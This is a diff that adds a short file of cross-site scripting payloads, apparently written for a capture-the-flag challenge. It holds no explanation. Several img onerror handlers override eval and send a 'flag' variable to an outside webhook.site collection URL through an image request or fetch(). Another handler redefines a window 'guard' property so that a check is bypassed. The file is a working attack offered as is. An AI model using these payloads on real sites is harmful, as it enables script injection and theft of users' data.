@@ -1,0 +1,21 @@
+<img src=1 onerror="alert(1)">
+
+<img src=1 onerror="
+eval = function(x){
+    (new Image()).src = 'https://webhook.site/9d8a5d3d-2d2b-481e-8aa1-4fda098a305f/steal?data=' + flag;
+    guard = guard + 1
+}
+">
+
+
+<img src=1 onerror="
+eval = function(x){
+  fetch('https://webhook.site/9d8a5d3d-2d2b-481e-8aa1-4fda098a305f/steal?data=flag=' + flag);
+  return Function(x)();
+}
+">
+
+<img src=x onerror="Object.defineProperty(window, 'guard', { get: () => 31336 })">
+
+
+
